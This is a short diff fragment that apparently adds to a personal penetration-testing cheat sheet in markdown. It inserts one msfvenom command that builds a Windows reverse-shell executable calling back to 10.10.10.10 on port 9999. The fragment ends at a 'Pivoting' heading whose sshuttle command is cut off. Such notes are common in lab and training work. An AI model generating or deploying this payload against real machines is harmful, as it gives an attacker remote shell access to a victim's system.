@@ -1,3 +1,7 @@
+# mfsvenom
+
+	msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o rev.exe
+
 # Pivoting
 
 Sshuttle Command:
